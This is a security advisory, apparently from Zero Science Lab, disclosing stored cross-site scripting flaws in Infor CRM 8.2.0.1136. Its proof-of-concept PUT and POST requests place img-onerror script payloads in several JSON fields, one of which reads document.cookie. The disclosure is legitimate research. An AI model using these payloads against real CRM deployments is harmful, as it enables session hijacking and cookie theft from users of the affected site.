@@ -1,0 +1,175 @@
+﻿
+Infor CRM 8.2.0.1136 Multiple HTML Script Injection Vulnerabilities
+
+
+Vendor: Infor
+Product web page: http://www.infor.com
+Affected version: 8.2.0.1136
+
+
+Summary: Infor® CRM, formerly Saleslogix, is an award-winning
+customer relationship management (CRM) solution that provides
+a complete view of customer interactions, so your business can
+collaborate and respond promptly and knowledgably to customer
+inquiries, sales opportunities, and service requests. Infor CRM
+includes a robust suite of sales, marketing, and service capabilities,
+to offer businesses of all sizes a fast, flexible, and affordable
+solution for finding, winning, and growing profitable customer
+relationships.
+
+Desc: Infor CRM suffers from multiple stored cross-site scripting
+vulnerabilities. Input passed to several POST/PUT parameters in
+JSON format is not properly sanitised before being returned to the
+user. This can be exploited to execute arbitrary HTML and script
+code in a user's browser session in context of an affected site.
+
+Tested on: Microsoft-IIS/8.5
+           ASP.NET/4.0.30319
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2016-5308
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2016-5308.php
+
+
+21.01.2016
+
+---
+
+
+----------------------------------
+Affected parameter(s): description
+----------------------------------
+
+PUT /SLXClient/slxdata.ashx/slx/system/-/attachments(%22eUSERA0004IX%22)?_includeFile=false&format=json&_t=1456358980947 HTTP/1.1
+Host: intranet.zeroscience.mk
+
+
+{$updated: "/Date(1456359095000)/", $key: "eUSERA0004IX",…}
+"": ""
+$descriptor: ""
+$etag: "+CgjMLB+0nA="
+$httpStatus: 200
+$key: "eUSERA0004IX"
+$lookup: "https://intranet.zeroscience.mk/SLXClient/slxdata.ashx/slx/system/-/attachments?format=json"
+$post: "https://intranet.zeroscience.mk/SLXClient/slxdata.ashx/slx/system/-/attachments?format=json"
+$schema: "https://intranet.zeroscience.mk/SLXClient/slxdata.ashx/slx/system/-/attachments/$schema?format=json"
+$service: "https://intranet.zeroscience.mk/SLXClient/slxdata.ashx/slx/system/-/attachments/$service?format=json"
+$template: "https://intranet.zeroscience.mk/SLXClient/slxdata.ashx/slx/system/-/attachments/$template?format=json"
+$updated: "/Date(1456359095000)/"
+$url: "https://intranet.zeroscience.mk/SLXClient/slxdata.ashx/slx/system/-/attachments('eUSERA0004IX')"
+accountId: null
+activityId: null
+attachDate: "2016-01-25T00:09:39Z"
+contactId: null
+contractId: null
+createDate: "/Date(1456359095000)/"
+createUser: "UUSERA0005W0"
+dataType: "R"
+defectId: null
+description: "<img src=j onerror=confirm(document.cookie) >"
+details: {createSource: null}
+documentType: null
+fileExists: true
+fileName: "inforcrm_xss.png"
+fileSize: 101722
+historyId: null
+leadId: null
+modifyDate: "/Date(1456359095000)/"
+modifyUser: "UUSERA0005W0"
+opportunityId: null
+physicalFileName: "!eUSERA0004IXinforcrm_xss.png"
+productId: null
+remoteStatus: null
+returnId: null
+salesOrderId: null
+ticketId: null
+url: null
+user: {$key: "UUSERA0005W0"}
+
+
+
+-----------------------------------------------------------
+Affected parameter(s): Description, Location, and LongNotes
+-----------------------------------------------------------
+
+POST /SLXClient/slxdata.ashx/slx/system/-/activities?format=json&_t=1456357736977 HTTP/1.1
+Host: intranet.zeroscience.mk
+
+
+{$httpStatus: 200, $descriptor: "", ActivityBasedOn: null, Alarm: false,…}
+$descriptor: ""
+$httpStatus: 200
+AccountId: null
+AccountName: null
+ActivityAttendees: {}
+ActivityBasedOn: null
+Alarm: false
+AlarmTime: "2016-01-24T22:45:00Z"
+AllowAdd: true
+AllowComplete: true
+AllowDelete: true
+AllowEdit: true
+AllowSync: true
+AppId: null
+Attachment: false
+AttachmentCount: null
+AttendeeCount: 0
+Category: "Pleasantville"
+ContactId: null
+ContactName: null
+CreateDate: "/Date(-62135596800000)/"
+CreateUser: null
+Description: "<img src=zsl onerror=prompt(1) >"
+Details: {ForeignId1: null, ForeignId2: null, ForeignId3: null, ForeignId4: null, ProjectId: null,…}
+ChangeKey: null
+CreateSource: null
+ForeignId1: null
+ForeignId2: null
+ForeignId3: null
+ForeignId4: null
+GlobalSyncId: null
+ProjectId: null
+Tick: null
+UserDef1: null
+UserDef2: null
+UserDef3: null
+Duration: "0"
+EndDate: "/Date(1456359315286)/"
+LeadId: null
+LeadName: null
+Leader: {$key: "UUSERA0005W0", $descriptor: "Userovich, User"}
+$descriptor: "Userovich, User"
+$key: "UUSERA0005W0"
+Location: "<img src=zsl onerror=prompt(2) >"
+LongNotes: "<img src=zsl onerror=prompt(3) >"
+ModifyDate: "/Date(-62135596800000)/"
+ModifyUser: null
+Notes: "Zero Science Lab"
+OpportunityId: null
+OpportunityName: null
+OriginalDate: "/Date(1456358415286)/"
+PhoneNumber: null
+Priority: "1"
+ProcessId: null
+ProcessNode: null
+RecurIterations: 0
+RecurPeriod: 0
+RecurPeriodSpec: 0
+RecurSkip: null
+RecurrenceState: "rsNotRecurring"
+Recurring: false
+Resources: {}
+Rollover: false
+StartDate: "2016-01-25T00:00:05Z"
+TicketId: null
+TicketNumber: null
+Timeless: true
+Type: "atToDo"
+UserActivities: {}
+$url: "https://intranet.zeroscience.mk/SLXClient/slxdata.ashx/slx/system/-/userActivities?format=json&where=Activity.Id%20eq%20%27VUSERA000CZ7%27"
+UserNotifications: {}
+$url: "https://intranet.zeroscience.mk/SLXClient/slxdata.ashx/slx/system/-/userNotifications?format=json&where=Activity.Id%20eq%20%27VUSERA000CZ7%27"
